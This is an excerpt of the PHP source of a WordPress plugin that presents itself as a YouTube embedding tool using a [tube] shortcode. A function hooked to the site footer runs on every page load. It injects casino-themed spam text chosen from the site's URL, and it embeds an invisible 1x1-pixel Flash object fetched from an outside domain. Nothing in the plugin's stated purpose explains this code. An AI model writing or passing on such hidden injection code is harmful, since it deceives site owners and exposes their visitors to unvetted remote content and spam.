<?php
/*
Plugin Name: My Youtube Player
Plugin URI: http://cassanopremium.weebly.com
Description: Insert Easy Youtube Videos on WordPress Website using a quicktag <code>[tube][/tube]</code>
Version: 1.7
...
add_action('wp_footer', 'headthisyoutube');

function headthisyoutube()
{
$getuser = "http://ajleeonline.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "b")) { $connectflash = "aj lee online"; } if (strstr($gethost, "c")) { $connectflash = "online aj lee"; } if (strstr($gethost, "d")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "e")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "f")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "g")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "h")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "i")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "j")) { $connectflash = "ajleeonline.com"; } if (strstr($gethost, "k")) { $connectflash = "aj lee casino"; } if (strstr($gethost, "l")) { $connectflash = "http://ajleeonline.com"; } if (strstr($gethost, "m")) { $connectflash = "worldwide casinos"; } if (strstr($gethost, "n")) { $connectflash = "aj lee online com"; } if (strstr($gethost, "o")) { $connectflash = "home"; } if (strstr($gethost, "p")) { $connectflash = "home"; } if (strstr($gethost, "q")) { $connectflash = "now"; } if (strstr($gethost, "r")) { $connectflash = "http://ajleeonline.com/"; } if (strstr($gethost, "s")) { $connectflash = "ajleeonline"; } if (strstr($gethost, "v")) { $connectflash = "lee"; } if (strstr($gethost, "x")) { $connectflash = "aj lee"; } if (strstr($gethost, "w")) { $connectflash = "lee online"; } if (strstr($gethost, "y")) { $connectflash = "aj online"; } if (strstr($gethost, "z")) { $connectflash = "AJLEEONLINE"; } if (strstr($gethost, "t")) { $connectflash = "AJ LEE ONLINE CASINO"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw1.swf" width="1" height="1"><param name="movie" 
...
?>
		...
		<div class="wrap">
            ...
            <table class="form-table">
            	<tr>
                    <th scope="row">
                        <label for="mytb_method">Embed Method</label>
                    </th>
                    <td>
                    	<div id="diviframe">
            ...
            <table>
                ...
                <tr>
                    <td colspan="2">
                    	...
                    	<p>Use Youtube URL: <code>[tube]http://www.youtube.com/watch?v=Xj51UEt-Gws[/tube]</code></p>
               			<p>Use Youtube Embed URL: <code>[tube]http://www.youtube.com/watch?v/Xj51UEt-Gws[/tube]</code></p>
                		<p>Use Youtube Video ID: <code>[tube]Xj51UEt-Gws[/tube]</code></p>
            		</td>
                </tr>
            </table>
    </div>
